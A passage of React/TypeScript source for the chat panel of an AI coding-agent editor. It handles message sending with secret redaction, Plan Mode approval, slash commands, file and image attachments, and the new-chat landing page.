	const onSubmit = useCallback(async (_forceSubmit?: string) => {

		if (isDisabled && !_forceSubmit) return
		if (imagesBlocked && !_forceSubmit) return // the card above the box says why, and what to do

		const threadId = composerThreadId
		if (chatThreadsService.state.currentThreadId !== threadId || pendingSends.current.has(threadId)) return

		// what is typed, then each long paste in a block, as one message
		const typed = _forceSubmit || textAreaRef.current?.value || ''
		const userMessage = _forceSubmit ? typed : [typed.trim() ? typed : '', ...pastes.map(p => attachmentBlock(p.title, p.text))].filter(Boolean).join('\n\n')

		// a key in the text never leaves this computer: it is taken out of the message, which is kept in the box so the person can go on from it
		const hits = findSecrets(userMessage)
		if (hits.length > 0) {
			setSecretHits(hits)
			if (!_forceSubmit) textAreaFnsRef.current?.setValue(redactSecrets(typed))
			setPastes(ps => ps.map(p => ({ ...p, text: redactSecrets(p.text) })))
			return
		}
		setSecretHits(null)

		if (isRunning) {
			// a run is going: the message waits for it to end (Send now stops the run and sends it at once); images do not wait in the queue
			if ((images.length > 0 || selections.length > 0) && !_forceSubmit) { setSlashNote({ text: 'A message with files or images cannot wait for the run to end. Send it when the run is done, or stop the run first.', busy: false }); return }
			if (!chatThreadsService.queueMessage(threadId, userMessage)) return
		} else {
			pendingSends.current.add(threadId)
			setPreparingThreads(ids => new Set(ids).add(threadId))
			try {
				await agentGatewayService.startTask({ userMessage, threadId, ...(images.length > 0 && !_forceSubmit ? { images } : {}) })
			} catch (e) {
				console.error('Error while sending message in chat:', e)
				if (chatThreadsService.state.currentThreadId === threadId) setSlashNote({ text: 'The message could not be sent. Your files are still attached. Try again.', busy: false })
				return
			} finally {
				pendingSends.current.delete(threadId)
				setPreparingThreads(ids => { const next = new Set(ids); next.delete(threadId); return next })
			}
		}

		// Only consume the context that went with this request. Another file or
		// image may have been attached while its asynchronous preparation ran.
		const draft = chatThreadsService.state.allThreads[threadId]?.state
		if (draft) chatThreadsService.setThreadComposerState(threadId, {
			composerAttachments: _forceSubmit ? draft.composerAttachments : (draft.composerAttachments ?? []).filter(p => !pastes.some(sent => sent.id === p.id)),
			composerImages: _forceSubmit ? draft.composerImages : (draft.composerImages ?? []).filter(i => !images.some(sent => sent.id === i.id)),
			stagingSelections: draft.stagingSelections.filter(s => !selections.includes(s)),
		})
		if (!_forceSubmit && chatThreadsService.state.currentThreadId === threadId && textAreaRef.current?.value === typed) {
			textAreaFnsRef.current?.setValue('')
			textAreaRef.current?.focus()
		}

	}, [chatThreadsService, composerThreadId, agentGatewayService, isDisabled, isRunning, pastes, images, selections, imagesBlocked, textAreaRef, textAreaFnsRef, setPastes])

	const onAbort = async () => {
		const threadId = currentThread.id
		await agentGatewayService.cancelTask(threadId)
	}

	// Vader addition: Plan Mode's "Approve & Execute" handoff - see chatThreadService.ts's
	// PlanObject/_maybeCaptureThreadPlan and docs/integrations/plan-mode.md.
	const onApprovePlan = useCallback(async () => {
		const plan = currentThread.activePlan
		if (!plan) return
		const planMessage = `Execute the plan below exactly as approved. If executing it reveals that one of its assumptions was wrong, say so and explain what you're doing differently before proceeding.

Objective: ${plan.objective}

Phases:
${plan.phases.map((p, i) => `${i + 1}. ${p}`).join('\n')}

Files/subsystems involved: ${plan.filesOrSubsystems.join(', ') || '(none listed)'}

Constraints: ${plan.constraints || '(none stated)'}

Validation requirements: ${plan.validationRequirements || '(none stated)'}

Assumptions to keep in mind (double-check these as you go): ${plan.unresolvedAssumptions || '(none noted)'}`
		vaderSettingsService.setGlobalSetting('chatMode', 'agent')
		chatThreadsService.clearThreadPlan(currentThread.id)
		await agentGatewayService.startTask({ threadId: currentThread.id, userMessage: planMessage })
	}, [currentThread, vaderSettingsService, chatThreadsService, agentGatewayService])

	const onDiscardPlan = useCallback(() => {
		chatThreadsService.clearThreadPlan(currentThread.id)
	}, [chatThreadsService, currentThread])


	const threadId = currentThread.id
	const currCheckpointIdx = chatThreadsState.allThreads[threadId]?.state?.currCheckpointIdx ?? undefined  // if not exist, treat like checkpoint is last message (infinity)



	// resolve mount info
	const isResolved = chatThreadsState.allThreads[threadId]?.state.mountedInfo?.mountedIsResolvedRef.current
	useEffect(() => {
		if (isResolved) return
		chatThreadsState.allThreads[threadId]?.state.mountedInfo?._whenMountedResolver?.({
			textAreaRef: textAreaRef,
			scrollToBottom: () => scrollToBottom(scrollContainerRef),
		})

	}, [chatThreadsState, threadId, textAreaRef, scrollContainerRef, isResolved])




	const previousMessagesHTML = useMemo(() => {
		// const lastMessageIdx = previousMessages.findLastIndex(v => v.role !== 'checkpoint')
		// tool request shows up as Editing... if in progress
		const bubble = (message: ChatMessage, i: number) => <ChatBubble
			key={i}
			currCheckpointIdx={currCheckpointIdx}
			chatMessage={message}
			messageIdx={i}
			isCommitted={true}
			chatIsRunning={isRunning}
			threadId={threadId}
			_scrollToBottom={() => scrollToBottom(scrollContainerRef)}
		/>
		// blocks: a message of its own, or a run of quiet tool rows (reads, searches, commands that ran, pages the agent opened) kept close together
		const blocks: React.ReactNode[] = []
		let run: React.ReactNode[] = []
		let explored: { message: ChatMessage & { role: 'tool' }, i: number }[] = []
		const flushExplored = () => {
			if (explored.length === 1) run.push(bubble(explored[0].message, explored[0].i))
			else if (explored.length > 1) run.push(<ExploredGroup key={'ex' + explored[0].i} items={explored.map(e => ({ message: e.message, node: bubble(e.message, e.i) }))} />)
			explored = []
		}
		const flushRun = () => { flushExplored(); if (run.length > 0) blocks.push(<div key={'run' + blocks.length} className='flex flex-col gap-0.5' data-testid='vader-tool-run'>{run}</div>); run = [] }
		previousMessages.forEach((message, i) => {
			if (isExploreMessage(message)) { explored.push({ message, i }); return }
			if (isQuietToolMessage(message)) { flushExplored(); run.push(bubble(message, i)); return }
			flushRun(); blocks.push(bubble(message, i))
		})
		flushRun()
		return blocks
	}, [previousMessages, threadId, currCheckpointIdx, isRunning])

	const streamingChatIdx = previousMessages.length
	const currStreamingMessageHTML = reasoningSoFar || displayContentSoFar || isRunning ?
		<ChatBubble
			key={'curr-streaming-msg'}
			currCheckpointIdx={currCheckpointIdx}
			chatMessage={{
				role: 'assistant',
				displayContent: displayContentSoFar ?? '',
				reasoning: reasoningSoFar ?? '',
				anthropicReasoning: null,
			}}
			messageIdx={streamingChatIdx}
			isCommitted={false}
			chatIsRunning={isRunning}

			threadId={threadId}
			_scrollToBottom={null}
		/> : null


	// the tool currently being generated
	const generatingTool = toolIsGenerating ?
		toolCallSoFar.name === 'edit_file' || toolCallSoFar.name === 'rewrite_file' ? <EditToolSoFar
			key={'curr-streaming-tool'}
			toolCallSoFar={toolCallSoFar}
		/>
			: null
		: null

	const messagesHTML = <ScrollToBottomContainer
		key={'messages' + chatThreadsState.currentThreadId} // force rerender on all children if id changes
		scrollContainerRef={scrollContainerRef}
		style={{ WebkitMaskImage: 'linear-gradient(to bottom, transparent 0, #000 40px)', maskImage: 'linear-gradient(to bottom, transparent 0, #000 40px)' }}
		className={`
			flex flex-col
			w-full flex-1 min-h-0
			overflow-x-hidden
			overflow-y-auto
			${previousMessages.length === 0 && !displayContentSoFar ? 'hidden' : ''}
		`}
	>
		<div className='w-full mx-auto flex flex-col' data-testid='vader-messages' style={{ maxWidth: 950, padding: compact ? '12px 12px' : '16px 20px', minHeight: '100%' }}>
		<div className='flex flex-col mt-auto' style={{ gap: 18 }}>
		{/* previous messages */}
		{previousMessagesHTML}
		{currStreamingMessageHTML}

		{/* Generating tool */}
		{generatingTool}

		{/* loading indicator */}
		{isRunning === 'LLM' || isRunning === 'idle' && !toolIsGenerating ? <ProseWrapper>
			{<IconLoading className='opacity-50 text-sm' />}
		</ProseWrapper> : null}


		{/* the person stopped the run, or it finished and changed files */}
		{!isRunning ? <ErrorBoundary><StoppedCard threadId={threadId} /></ErrorBoundary> : null}
		{!isRunning && latestError === undefined ? <ErrorBoundary><FinishedCard threadId={threadId} isRunning={!!isRunning} /></ErrorBoundary> : null}

		{/* error message */}
		{latestError === undefined ? null :
			<div className='my-1'>
				<ErrorDisplay
					message={latestError.message}
					fullError={latestError.fullError}
					onDismiss={() => { agentGatewayService.dismissError(currentThread.id) }}
					showDismiss={true}
				/>

			</div>
		}

		{/* Plan Mode: a captured plan waiting for approval - see PlanObject in chatThreadService.ts */}
		{currentThread.activePlan && !isRunning ?
			<div className='mx-2 my-1 px-3 py-2 rounded border border-vader-border-1 bg-vader-bg-2'>
				<div className='font-medium text-sm mb-1'>Plan ready</div>
				<div className='text-vader-fg-3 text-xs mb-2'>{currentThread.activePlan.objective}</div>
				<div className='flex gap-x-2'>
					<VaderButtonBgDarken className='px-3 py-1 text-xs' onClick={onApprovePlan}>Approve &amp; Execute (switches to Agent mode)</VaderButtonBgDarken>
					<VaderButtonBgDarken className='px-3 py-1 text-xs' onClick={onDiscardPlan}>Discard</VaderButtonBgDarken>
				</div>
				</div>
				: null}
		</div>
		</div>
		</ScrollToBottomContainer>


	// commands: a line that begins with / offers them; each one calls the real service
	const [typed, setTyped] = useState('')
	const [slashIdx, setSlashIdx] = useState(0)
	const [slashHidden, setSlashHidden] = useState(false)
	const [slashNote, setSlashNote] = useState<{ text: string, busy: boolean } | undefined>()
	const slashList = slashHidden ? undefined : slashMatches(typed)
	const memoryService = accessor.get('IMemoryService')
	const verificationService = accessor.get('IVerificationService')
	const runSlash = useCallback(async (command: SlashCommand, arg: string) => {
		const id = chatThreadsService.state.currentThreadId
		const clear = () => { textAreaFnsRef.current?.setValue(''); setTyped(''); setInstructionsAreEmpty(true) }
		const project = chatThreadsService.getCurrentProjectKey()
		if (command.id === 'plan') {
			vaderSettingsService.setGlobalSetting('chatMode', 'plan'); clear()
			setSlashNote({ text: 'Plan mode. It writes a plan and changes nothing until you approve it.', busy: false })
		}
		else if (command.id === 'compact') {
			clear(); setSlashNote({ text: 'Summarising the earlier steps...', busy: true })
			const r = await chatThreadsService.compactThreadNow(id)
			setSlashNote({ text: r === 'done' ? 'The earlier steps are summarised.' : r === 'nothing' ? 'There is too little to summarise yet.' : 'The model did not answer, so nothing was summarised.', busy: false })
		}
		else if (command.id === 'remember') {
			if (!arg) { textAreaFnsRef.current?.setValue('/remember '); setTyped('/remember '); setSlashNote({ text: 'Write the note after /remember, then press Enter.', busy: false }); return }
			if (!project) { setSlashNote({ text: 'Open a folder first: a note is kept for a project.', busy: false }); return }
			memoryService.write({ scope: 'project', scopeKey: project, label: noteLabel(arg), content: arg, source: 'user_written' })
			clear(); setSlashNote({ text: `Saved for ${projectNameOf(project)}. The agent reads it in this project from now on. You can change it in Settings, Memory.`, busy: false })
		}
		else if (command.id === 'init') {
			clear(); vaderSettingsService.setGlobalSetting('chatMode', 'agent')
			try { await agentGatewayService.startTask({ userMessage: INIT_PROMPT, threadId: id }) } catch (e) { console.error('Error while starting /init:', e) }
		}
		else if (command.id === 'review') {
			const thread = chatThreadsService.state.allThreads[id]
			const lastUser = [...(thread?.messages ?? [])].reverse().find(m => m.role === 'user')
			const objective = lastUser && lastUser.role === 'user' && lastUser.displayContent ? lastUser.displayContent : 'Check the changes made in this project.'
			clear(); setSlashNote({ text: 'Checking the changes with a second agent. It reads them and runs the project\u2019s checks, and cannot change anything...', busy: true })
			try {
				const { verdict } = await verificationService.runIndependentVerification({ objective })
				const blockers = verdict.findings.filter(f => f.severity === 'blocker').length
				setSlashNote({ text: `${verdict.passed ? 'The check passed.' : `The check found ${blockers} blocker${blockers === 1 ? '' : 's'}.`} ${verdict.summary}`.trim(), busy: false })
			} catch (e) { setSlashNote({ text: 'The check could not run: ' + (e instanceof Error ? e.message : String(e)), busy: false }) }
		}
	}, [chatThreadsService, vaderSettingsService, agentGatewayService, memoryService, verificationService, textAreaFnsRef])
	const pickSlash = useCallback((c: SlashCommand) => {
		if (c.takesText) { textAreaFnsRef.current?.setValue('/' + c.id + ' '); setTyped('/' + c.id + ' '); setInstructionsAreEmpty(false); textAreaRef.current?.focus(); return }
		void runSlash(c, '')
	}, [runSlash, textAreaFnsRef, textAreaRef])

	// files dropped on the box: text files are read and kept beside the message, like a long paste; what is not taken is said, with the reason
	// images dropped, pasted or taken from the clipboard: opened, made smaller when large, and kept beside the message
	const collectImages = useCallback(async (files: File[]) => {
		const verdict = checkImages(files.map(f => ({ name: f.name, size: f.size, type: f.type })), images.length)
		const refused = [...verdict.refused]
		const taken: ChatImage[] = []
		for (const i of verdict.accepted) {
			try { taken.push(await chatImageOfFile(files[i], Math.random().toString(36).slice(2))) }
			catch (e) { refused.push({ name: files[i].name, why: e instanceof Error ? e.message : 'it could not be read' }) }
		}
		if (taken.length > 0) setImages(list => [...list, ...taken].slice(0, MAX_IMAGES))
		return { taken, refused }
	}, [images.length, setImages])
	const addImageFiles = useCallback(async (files: File[]) => {
		const { taken, refused } = await collectImages(files)
		const note = dropNote({ accepted: taken.map(t => ({ name: t.name, size: t.bytes })), refused })
		if (chatThreadsService.state.currentThreadId === composerThreadId) setSlashNote(note ? { text: note, busy: false } : undefined)
	}, [collectImages, chatThreadsService, composerThreadId])

	// files dropped on the box: images are kept as images, text files are read and kept beside the message like a long paste; what is not taken is said, with the reason
	const onDropFiles = useCallback(async (all: File[]) => {
		const pictures = all.filter(f => looksLikeImage({ name: f.name, type: f.type }))
		const files = all.filter(f => !pictures.includes(f))
		const fromImages = pictures.length > 0 ? await collectImages(pictures) : { taken: [] as ChatImage[], refused: [] as { name: string, why: string }[] }
		const verdict = checkDrop(files.map(f => ({ name: f.name, size: f.size, type: f.type })), pastes.length)
		const refused = [...fromImages.refused, ...verdict.refused]
		const taken: Paste[] = []
		for (const info of verdict.accepted) {
			const file = files.find(f => f.name === info.name && f.size === info.size)
			if (!file) continue
			try {
				const text = await file.text()
				if (looksBinary(text)) { refused.push({ name: info.name, why: 'it is not a text file' }); continue }
				taken.push({ id: Math.random().toString(36).slice(2), text, title: info.name, label: sizeWords(info.size) })
			} catch { refused.push({ name: info.name, why: 'it could not be read' }) }
		}
		if (taken.length > 0) setPastes(ps => [...ps, ...taken])
		const note = dropNote({ accepted: [...fromImages.taken.map(t => ({ name: t.name, size: t.bytes })), ...taken.map(t => ({ name: t.title ?? '', size: 0 }))], refused })
		if (chatThreadsService.state.currentThreadId === composerThreadId) setSlashNote(note ? { text: note, busy: false } : undefined)
	}, [pastes.length, collectImages, setPastes, chatThreadsService, composerThreadId])

	const onChangeText = useCallback((newStr: string) => {
		setInstructionsAreEmpty(!newStr)
		setTyped(newStr); setSlashIdx(0); setSlashHidden(false)
	}, [setInstructionsAreEmpty])
	const onKeyDown = useCallback((e: KeyboardEvent<HTMLTextAreaElement>) => {
		// Ctrl 1 to 4: Agent, Plan, Gather, Chat (what the Mode menu says)
		if ((e.ctrlKey || e.metaKey) && !e.shiftKey && !e.altKey && /^[1-4]$/.test(e.key)) {
			e.preventDefault(); e.stopPropagation()
			vaderSettingsService.setGlobalSetting('chatMode', CHAT_MODE_ORDER[Number(e.key) - 1])
			return
		}
		if (slashList && slashList.length > 0 && !e.nativeEvent.isComposing) {
			if (e.key === 'ArrowDown' || e.key === 'ArrowUp') { e.preventDefault(); setSlashIdx(i => (i + (e.key === 'ArrowDown' ? 1 : slashList.length - 1)) % slashList.length); return }
			if (e.key === 'Escape') { e.preventDefault(); setSlashHidden(true); return }
			if ((e.key === 'Enter' && !e.shiftKey) || e.key === 'Tab') {
				e.preventDefault()
				const whole = parseSlash(typed)
				if (whole) void runSlash(whole.command, whole.arg)
				else pickSlash(slashList[Math.min(slashIdx, slashList.length - 1)])
				return
			}
		}
		if (e.key === 'Enter' && !e.shiftKey && !e.nativeEvent.isComposing) {
			onSubmit()
		} else if (e.key === 'Escape' && isRunning) {
			onAbort()
		}
	}, [onSubmit, onAbort, isRunning, slashList, slashIdx, typed, runSlash, pickSlash, vaderSettingsService])

	const inputChatArea = <VaderChatArea
		featureName='Chat'
		onSubmit={() => onSubmit()}
		onAbort={onAbort}
		isStreaming={!!isRunning}
		isDisabled={isDisabled}
		showSelections={true}
		// showProspectiveSelections={previousMessagesHTML.length === 0}
		selections={selections}
		setSelections={setSelections}
		onClickAnywhere={() => { textAreaRef.current?.focus() }}
		showFooter
		onDropFiles={(files) => { void onDropFiles(files) }}
		onAddContext={() => { const t = textAreaRef.current; if (t) { t.focus(); try { document.execCommand('insertText', false, '@') } catch { /* the @ menu opens when typing it */ } } }}
	>
		<ImageChips images={images} onRemove={id => setImages(list => list.filter(i => i.id !== id))} />
		<PastedChips pastes={pastes} onRemove={id => setPastes(ps => ps.filter(p => p.id !== id))} />
		<VaderInputBox2
			enableAtToMention
				className={`min-h-[22px] px-0.5 py-0 bg-transparent text-[14px] leading-[1.5]`}
			testId='vader-input'
placeholder={isRunning ? 'Add a message for after this run' : previousMessages.length === 0 && settingsState.globalSettings.chatMode === 'agent' ? 'Describe the task' : PLACEHOLDER_OF_MODE[settingsState.globalSettings.chatMode] ?? PLACEHOLDER_OF_MODE.agent}
			onPasteFiles={(files) => { const pics = files.filter(f => looksLikeImage({ name: f.name, type: f.type })); if (pics.length === 0) return false; void addImageFiles(pics); return true }}
			extraSources={() => peekContextSources(accessor)}
			onPickExtra={(id: ContextSourceId) => { if (id === 'image') { void imagesOnClipboard().then(files => { if (files.length === 0) { setSlashNote({ text: 'There is no image on the clipboard.', busy: false }); return } void addImageFiles(files) }); return } void readContextSource(accessor, id).then(r => { if (!r) { setSlashNote({ text: 'There is nothing to attach from there right now.', busy: false }); return } setPastes(ps => [...ps, { id: Math.random().toString(36).slice(2), text: r.text, title: r.title }]); if (r.cut) setSlashNote({ text: `${r.title} was long, so only part of it is attached.`, busy: false }) }) }}
			onPasteText={(text) => { if (!shouldFoldPaste(text)) return false; setPastes(ps => [...ps, { id: Math.random().toString(36).slice(2), text }]); return true }}
			onChangeText={onChangeText}
			onKeyDown={onKeyDown}
			onFocus={() => { chatThreadsService.setCurrentlyFocusedMessageIdx(undefined) }}
			ref={composerRef}
			fnsRef={textAreaFnsRef}
			multiline={true}
		/>

	</VaderChatArea>


	const isLandingPage = previousMessages.length === 0


	// what to start from: with a project open these are about the project; without one, plain questions
	const hasProject = !!chatThreadsService.getCurrentProjectKey()
	const initiallySuggestedPromptsHTML = <div className='flex flex-col w-full text-nowrap select-none'>
		{(hasProject ? [
			'Add a rules file for this project',
			'Explain how this project is laid out',
			'Find and fix a failing test',
		] : []).map((text, index) => (
			<div
				key={index}
				data-testid='vader-suggestion'
				className='flex items-center h-9 px-1 border-t border-vader-border-3 rounded-sm text-[13px] text-vader-fg-1 hover:bg-vader-bg-2-hover cursor-pointer transition-colors duration-150'
				onClick={() => onSubmit(text)}
			>
				{text}
			</div>
		))}
	</div>



	const aboveComposer = <div className='flex flex-col gap-2'>
		<ErrorBoundary><NoModelCard /></ErrorBoundary>
		{imagesBlocked ? <ErrorBoundary><ImagesBlockedCard modelName={settingsState.globalSettings.externalAgentId ? 'The connected agent' : (chatModel?.modelName ?? 'This model')} count={images.length} onChoose={() => { (document.querySelector('[data-testid="vader-picker-button"]') as HTMLElement | null)?.click() }} onRemove={() => setImages([])} /></ErrorBoundary> : null}
		{!isLandingPage ? <ErrorBoundary><OfflineBanner /></ErrorBoundary> : null}
		{slashNote ? <ErrorBoundary><SlashNote text={slashNote.text} busy={slashNote.busy} onDismiss={() => setSlashNote(undefined)} /></ErrorBoundary> : null}
		{slashList && slashList.length > 0 ? <ErrorBoundary><SlashMenu commands={slashList} index={Math.min(slashIdx, slashList.length - 1)} onPick={pickSlash} onHover={setSlashIdx} /></ErrorBoundary> : null}
		{secretHits ? <ErrorBoundary><SecretBlockedCard hits={secretHits} onEdit={() => { setSecretHits(null); textAreaRef.current?.focus() }} onDismiss={() => setSecretHits(null)} /></ErrorBoundary> : null}
		{isRunning ? <ErrorBoundary><PausedCard threadId={threadId} /></ErrorBoundary> : null}
		<ErrorBoundary><TaskCopyArea threadId={threadId} isRunning={!!isRunning} /></ErrorBoundary>
		<ErrorBoundary><McpToolChangedArea /></ErrorBoundary>
		<ErrorBoundary><ContextBanner threadId={threadId} isRunning={!!isRunning} /></ErrorBoundary>
		<ErrorBoundary><QueueList threadId={threadId} queued={currentThread.queued ?? []} /></ErrorBoundary>
	</div>
	const hint = isLandingPage && instructionsAreEmpty && pastes.length === 0 && !isRunning ?<div className='px-3 pt-1.5 text-xs text-vader-fg-3 select-none' data-testid='vader-composer-hint'>Enter sends, Shift Enter adds a line.</div> : null

	const threadPageInput = <div key={'input' + chatThreadsState.currentThreadId} className='flex-none' style={{ padding: compact ? '0 10px 10px' : '0 20px 14px' }}>
		<div className='w-full mx-auto flex flex-col gap-2' style={{ maxWidth: 900 }}>
			<CommandBarInChat />
			{aboveComposer}
			<ComposerProjectPicker />
			{inputChatArea}
			{hint}
		</div>
	</div>

	// a new chat (board R21): what this is, the message box, and where to pick up
	const projectKey = chatThreadsService.getCurrentProjectKey()
	const projectName = projectKey ? projectNameOf(projectKey) : undefined
	const recent = useMemo(() => {
		const groups = chatThreadsService.listProjectGroups()
		const group = groups.find(g => g.key === projectKey) ?? groups[0]
		return (group?.threadIds ?? []).slice(0, 3).map(id => {
			const t = chatThreadsState.allThreads[id]
			const first = t?.messages.find(m => m.role === 'user')
			const title = first && first.role === 'user' ? (first.displayContent || '').replace(/\s+/g, ' ').trim() : ''
			return { id, title: title || 'New chat', status: chatThreadsService.getThreadStatus(id) }
		}).filter(r => r.id !== threadId)
	}, [chatThreadsService, chatThreadsState, projectKey, threadId])

	// what this chat will do in this project, in the mode it is in
	const landingMode = settingsState.globalSettings.chatMode
	const landingText = !hasProject ? 'No folder is open, so this is a plain conversation. Open a folder to let the agent work in a project.'
		: landingMode === 'agent' ? (settingsState.globalSettings.taskCopies ? 'In Agent mode it works in its own copy of the project, so nothing in your folder changes until you accept.' : 'Agent mode reads and edits the files of this project and shows every change for you to accept or reject.')
			: landingMode === 'plan' ? 'In Plan mode it reads the project and writes a plan. Nothing changes until you approve it.'
				: landingMode === 'gather' ? 'In Gather mode it reads the project and answers. It changes nothing.'
					: 'In Chat mode it answers without reading or changing the project.'
	const landingPageContent = <div
		ref={sidebarRef}
		className='w-full h-full max-h-full flex flex-col overflow-auto px-4 items-center justify-center'
		data-testid='vader-landing'
	>
		<div className='w-full flex flex-col gap-4 py-8' style={{ maxWidth: 700 }}>
			<ErrorBoundary>
				<div className='flex flex-col gap-1.5'>
					<h2 className='text-xl font-semibold text-vader-fg-1' data-testid='vader-landing-title'>{projectName ? `New chat in ${projectName}` : 'New chat'}</h2>
					<p className='text-vader-fg-3 leading-relaxed' data-testid='vader-landing-text'>{landingText}</p>
				</div>
				<OfflineBanner />
				{aboveComposer}
				<ComposerProjectPicker />
				{inputChatArea}
				{hint}
			</ErrorBoundary>

			<ErrorBoundary>
				{recent.length > 0 ? <div className='flex flex-col mt-2' data-testid='vader-landing-recent'>
					<div className='text-vader-fg-3 text-xs pb-1'>Pick up where you left off</div>
					{recent.map(r => <button key={r.id} className='flex items-center gap-2.5 h-9 border-t border-vader-border-3 text-left text-vader-fg-1 hover:bg-vader-bg-2-hover rounded-sm px-1' onClick={() => chatThreadsService.switchToThread(r.id)}>
						<span className='shrink-0 w-3.5 flex justify-center'>{r.status === 'needs_you' ? <span className='w-2 h-2 rounded-full bg-yellow-500' /> : r.status === 'running' ? <IconLoading className='text-vader-fg-3' /> : r.status === 'review' ? <span className='w-2.5 h-2.5 rounded-full border border-vader-fg-3' /> : null}</span>
						<span className='truncate flex-1'>{r.title}</span>
						<span className='text-vader-fg-3 text-xs shrink-0'>{r.status === 'review' ? 'Review it' : r.status === 'needs_you' ? 'Needs you' : ''}</span>
					</button>)}
				</div> : !hasProject ? null : <div className='flex flex-col gap-2 mt-2'>
					<div className='text-vader-fg-3 text-xs'>Start from one of these</div>
					{initiallySuggestedPromptsHTML}
				</div>}
			</ErrorBoundary>
		</div>
	</div>



	// const threadPageContent = <div>
	// 	{/* Thread content */}
	// 	<div className='flex flex-col overflow-hidden'>
	// 		<div className={`overflow-hidden ${previousMessages.length === 0 ? 'h-0 max-h-0 pb-2' : ''}`}>
	// 			<ErrorBoundary>
	// 				{messagesHTML}
	// 			</ErrorBoundary>
	// 		</div>
	// 		<ErrorBoundary>
	// 			{inputForm}
	// 		</ErrorBoundary>
	// 	</div>
	// </div>
	const threadPageContent = <div
		ref={sidebarRef}
		className='w-full h-full flex flex-col overflow-hidden'
	>

		<ErrorBoundary>
			{messagesHTML}
		</ErrorBoundary>
		<ErrorBoundary>
			{threadPageInput}
		</ErrorBoundary>
	</div>


	return (
		<Fragment key={threadId} // force rerender when change thread
		>
			{isLandingPage ?
				landingPageContent
				: threadPageContent}
		</Fragment>
	)
}
